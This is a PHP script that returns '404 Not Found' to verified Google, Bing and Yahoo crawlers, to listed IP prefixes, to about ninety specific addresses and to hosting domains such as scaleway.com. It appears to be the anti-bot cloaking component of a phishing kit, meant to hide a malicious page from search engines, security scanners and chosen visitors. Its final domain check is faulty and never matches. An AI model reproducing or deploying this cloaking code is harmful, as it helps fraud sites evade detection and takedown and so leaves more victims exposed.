<?php
function botcheck(){
 $spiders = array(
   array('AdsBot-Google','google.com'),
   array('Googlebot','google.com'),
   array('Googlebot-Image','google.com'),
   array('Googlebot-Mobile','google.com'),
   array('Mediapartners','google.com'),
   array('Mediapartners-Google','google.com'),
   array('msnbot','search.msn.com'),
   array('bingbot','bing.com'),
   array('Slurp','help.yahoo.com'),
   array('Yahoo! Slurp','help.yahoo.com')
 );
 $useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
 foreach($spiders as $bot) {
   if(preg_match("/$bot[0]/i",$useragent)){
     $ipaddress = $_SERVER['REMOTE_ADDR']; 
     $hostname = gethostbyaddr($ipaddress);
     $iphostname = gethostbyname($hostname);
     if (preg_match("/$bot[1]/i",$hostname) && $ipaddress == $iphostname){ header("HTTP/1.0 404 Not Found"); exit; }
   }
 }
}
botcheck();

$ip = @$_SERVER['REMOTE_ADDR'];
$nums = explode(".", "$ip") ;
@$shortip = $nums[0]. "." .$nums[1];
$deny = array("64.71", "209.19", "206.80", "206.207", "172.22", "212.47", "222.73");
if (in_array("$shortip", $deny)) {
    header("HTTP/1.0 404 Not Found");
	  die();
}

@$shortip = $nums[0]. "." .$nums[1]. "." .$nums[2];
$deny = array("222.73.144");
if (in_array("$shortip", $deny)) {
    header("HTTP/1.0 404 Not Found");
    die();
}

$deny = array(
    '197.0.172.199',
    '96.51.122.36',
    '205.237.24.7',
    '24.114.73.69',
    '184.70.209.170',
    '184.151.36.248',
    '198.8.80.63',
    '199.87.154.255',
    '108.61.226.12',
    '24.212.164.243',
    '207.161.106.221',
    '24.114.91.209',
    '45.3.28.140',
    '60.180.53.23',
    '184.151.127.152',
    '70.26.175.74',
    '64.178.154.103',
    '104.156.228.93',
    '172.98.67.46',
    '69.63.33.44',
    '142.160.17.46',
    '50.101.106.8',
    '74.15.248.178',
    '24.36.138.98',
    '142.114.217.181',
    '209.171.88.95',
    '113.210.79.96',
    '99.244.206.186',
    '216.8.141.2',
    '184.151.37.250',
    '70.194.192.11',
    '199.19.62.21',
    '209.195.66.8',
    '206.132.52.98',
    '108.173.159.191',
    '74.57.223.21',
    '24.114.45.43',
    '209.171.88.168',
    '67.71.130.186',
    '205.234.34.155',
    '142.167.147.157',
    '72.38.222.162',
    '24.68.140.122',
    '192.168.101.1',
    '184.162.226.74',
    '72.139.56.42',
    '173.238.19.182',
    '24.114.69.170',
    '184.151.36.224',
    '24.114.83.198',
    '99.237.254.119',
    '216.46.6.98',
    '68.0.153.245',
    '72.143.213.200',
    '199.119.233.188',
    '24.65.76.100',
    '69.42.188.50',
    '96.21.69.187',
    '63.250.121.158',
    '72.143.211.153',
    '24.114.107.80',
    '24.69.191.161',
    '70.27.107.246',
    '198.48.165.172',
    '209.171.88.238',
    '68.171.67.218',
    '50.100.206.202',
    '135.23.116.151',
    '70.70.152.19',
    '76.71.47.145',
    '216.226.39.179',
    '99.228.177.213',
    '24.201.185.78',
    '174.116.5.205',
    '64.110.221.150',
    '184.151.63.144',
    '197.226.109.100',
    '69.136.31.23',
    '64.114.70.78',
    '184.151.222.135',
    '96.127.229.92',
    '198.254.237.97',
    '199.119.233.234',
    '67.243.128.130',
    '74.220.167.97',
    '142.169.27.216',
    '184.161.94.32',
    '108.172.132.81',
    '197.167.30.75',
    '109.177.51.245',
    '24.114.73.216',
    '99.224.40.216'
  );

if (in_array($ip, $deny)) {
    header("HTTP/1.0 404 Not Found");
    die();
}

$deny = array(
    'googlebot.com',
    'scaleway.com',
    'pointandchange.com'
  );

foreach ($deny as $dns)
{
  if (strpos($ip, $dns) !== FALSE) {
    header("HTTP/1.0 404 Not Found");
    die();
  }
}

?>